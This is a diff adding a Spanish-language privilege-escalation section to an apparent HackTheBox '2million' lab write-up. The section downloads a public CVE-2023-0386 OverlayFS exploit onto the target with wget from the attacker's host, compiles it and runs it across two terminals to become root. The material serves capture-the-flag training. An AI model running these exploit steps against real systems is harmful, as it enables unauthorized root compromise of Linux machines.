@@ -204,14 +204,53 @@ ssh admin@2million.htb
 
 <figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
+### 🔐 **PRIVILEGIOS**
+
+Al estar dentro y ejecutar:
+
+```bash
+whoami
+```
+
+aún no somos **root**, por lo que hacemos:
+
+```bash
+sudo -l
+```
+
+para ver si hay algo para explotar pero nos pide contraseña. Tampoco tenemos permisos SUID.&#x20;
+
 Nos dice que tenemos un mail.
 
 <figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
+Al ver la información del sistema en el que nos encontramos encontramos este exploit.
+
 {% @github-files/github-code-block url="https://github.com/sxlmnwb/CVE-2023-0386" %}
+
+Nos lo descargamos en nuestra máquina víctima tras comprimirlo en nuestra máquina anfitrión.
 
 ```bash
 wget http://10.10.14.58/comprimido.zip
 ```
 
 <figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+Abrimos otra terminal y nos logueamos a través de **ssh** y también nos situamos en el directorio `/tmp/CVE-2023-0386`.
+
+```
+PRIMERA TERMINAL
+make all
+./fuse ./ovlcap/lower ./gc
+
+SEGUNDA TERMINAL
+./exp
+```
+
+Tras realizar esto nos convertimos en **root**.
+
+<figure><img src="../../.gitbook/assets/image (1166).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1165).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-12 153509.png" alt=""><figcaption></figcaption></figure>
